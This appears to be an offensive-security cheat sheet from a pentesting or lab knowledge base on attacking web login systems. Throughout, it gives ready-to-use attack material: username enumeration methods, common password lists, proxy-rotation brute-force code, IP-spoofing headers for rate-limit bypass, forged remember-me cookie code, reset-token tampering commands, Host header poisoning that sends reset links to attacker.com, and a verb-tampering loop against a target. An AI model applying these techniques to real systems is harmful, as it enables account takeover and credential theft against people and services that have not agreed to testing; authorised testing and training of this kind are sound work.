# Authentication — Complete Cheat Sheet

For per-technique scenarios, see `INDEX.md` and `scenarios/<family>/<scenario>.md`. This file is a quick-reference card for username enumeration, session attacks, password reset, and Burp Intruder configuration — content that doesn't fit cleanly into individual scenarios.

## Username Enumeration

### Error message analysis

Test usernames: `admin`, `administrator`, `root`, `user`, `test`, `guest`. Compare:
- `Invalid username` vs `Incorrect password` (wording diff = enumeration possible).
- Response length differences.
- HTTP status codes (200 vs 401 vs 403).
- Redirect behavior.

### Timing attack

```python
# Long password amplifies timing diff
password = "a" * 100
# Valid users take 50-200ms longer (password hash comparison)
```

### Account-lockout enumeration

Cluster Bomb: payload 1 = username list, payload 2 = null payload × 5. "Too many login attempts" appears only for valid users.

### Common usernames

```
admin       administrator   root        user        test
guest       operator        support     backup      webmaster
carlos      wiener           system      info        contact
```

## Top passwords to test

```
password    Password1       admin       123456      qwerty
welcome1    Welcome2024     P@ssw0rd    letmein     <COMPANY>2024
Summer2024! Spring2024!     Winter2024  changeme    !QAZ2wsx
```

## Brute-force bypass

### IP rotation

```python
import requests
proxies = ['proxy1:8080', 'proxy2:8080', 'proxy3:8080']
for i, password in enumerate(passwords):
    proxy = proxies[i % len(proxies)]
    r = requests.post(url, data=creds, proxies={'http':proxy,'https':proxy})
```

### Counter reset

Some apps reset the lockout counter on a successful login OR on a specific endpoint hit. Test by:
1. Send 4 wrong passwords (just under lockout).
2. Send 1 correct password (resets counter).
3. Send 4 more wrong passwords without lockout.

### Multiple credentials per request

GraphQL or batch APIs sometimes accept multiple credential pairs in one request, bypassing per-request rate limits. See API-specific docs.

## Session Management

### Stay-Logged-In / Remember-Me cookie analysis

```python
# Decode common formats
import base64, hashlib
cookie = "user:hash"      # often base64 or JSON
decoded = base64.b64decode(cookie).decode()

# Common: hash(username + secret + ip + ua)
# If hash is weak, brute force the secret
```

### Cookie construction

```python
# Reconstruct cookie if you know the algorithm
admin_cookie = base64.b64encode(
    f"admin:{hashlib.md5(b'admin'+secret).hexdigest()}".encode()
)
```

### Session fixation

1. Attacker gets a fresh session ID by hitting `/login`.
2. Tricks victim into logging in with that ID (URL parameter, XSS-set cookie).
3. After victim authenticates, attacker uses the (now-authenticated) ID.

Defense: rotate session ID on login.

### JWT manipulation

See `scenarios/jwt/`. Quick wins: `none-algorithm.md`, `weak-secret-crack.md`, `alg-confusion.md`.

## Password Reset Exploitation

### Broken token validation

```bash
# Token modification tests:
curl "/reset?token=ABC123" → success
curl "/reset?token=ABC124" → success ?    (close to original)
curl "/reset?token="        → success ?    (empty)
curl "/reset?token=null"     → success ?
curl "/reset?token[]=ABC123" → success ?    (array)
```

### Host header poisoning

```http
POST /reset_password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

If reset link uses `Host` header to construct URL, victim receives `https://attacker.com/reset?token=...` — capture token at attacker.com.

### Token predictability

Generate multiple reset tokens for the same/different accounts and analyze:
- Sequential? (timestamps, counters)
- Low entropy? (short strings, hex from time())
- Known seed? (md5 of email + timestamp)

### Password change enumeration

Test `/change_password` without current password validation:

```http
POST /change_password
{"new_password":"hacker123"}
# If 200, missing current-password check
```

## HTTP Verb Tampering (auth bypass)

When a path is protected by Basic Auth or a server-side ACL that only enforces on `GET` (or only on the verbs the developer thought of), swap the method to slip past the gate. Common when auth is wired to a specific `<Limit GET POST>` directive, a `location` block, or framework middleware keyed on the request method.

```bash
# Baseline: protected resource returns 401
curl -i http://<TARGET_IP>/secret/

# Try alternate verbs — any 200/redirect with body = bypass
for m in HEAD POST PUT DELETE PATCH OPTIONS TRACE FOO; do
  printf '%s: ' "$m"; curl -s -o /dev/null -w '%{http_code}\n' -X "$m" http://<TARGET_IP>/secret/
done
# HEAD returns no body but the same status as GET behind the ACL — use an arbitrary
# verb (e.g. FOO) or POST when you need the response body. Apache <Limit> only guards
# the listed methods; an unlisted verb is served unauthenticated.
```

Pair with content discovery: a verb-tampering bypass on a script or backup endpoint can leak source containing further secrets (hardcoded creds, API keys).

## Burp Intruder Reference

**Attack types:** Sniper (single set, one position), Battering Ram (single set, all positions), Pitchfork (multiple sets, paired), Cluster Bomb (multiple sets, all combos).

**Payload processing:** hash (MD5/SHA), encoding (Base64/URL), case mods, prefix/suffix, regex match/replace.

**Grep:** Match (highlight success indicator), Extract (pull value for chains).

**Session macros:** Project Options → Sessions → Add rule → Define macro (GET token → extract → use in POST).

**Resource pools (CRITICAL for time-based):** Create pool with Max concurrent = 1.

## HTTP Headers Reference

**Auth:** `Authorization: Basic <b64>`, `Authorization: Bearer <token>`, `Cookie: session=...`, `X-API-Key: ...`.

**IP spoofing (rate-limit bypass):** `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`, `True-Client-IP`, `CF-Connecting-IP`.

**Host manipulation:** `Host: attacker.com`, `X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, `Forwarded: host=attacker.com`.

**User-Agent:** rotate realistic UAs for fingerprint-based rate limiting.

## Common Exploitation Chains

- **Enum → Brute**: Enumerate via error diff → brute-force creds.
- **2FA Bypass**: OTP param manipulation OR endpoint skip OR response flip.
- **OAuth CSRF → ATO**: Missing state → account-link CSRF → login as victim.
- **Password Reset → ATO**: Token predictability OR host header poison.
- **Cookie Crack → ATO**: Decode remember-me cookie → reconstruct admin cookie.
- **Session Fix → ATO**: Set victim's session via XSS → login as victim.

See `INDEX.md` for the full scenario list.
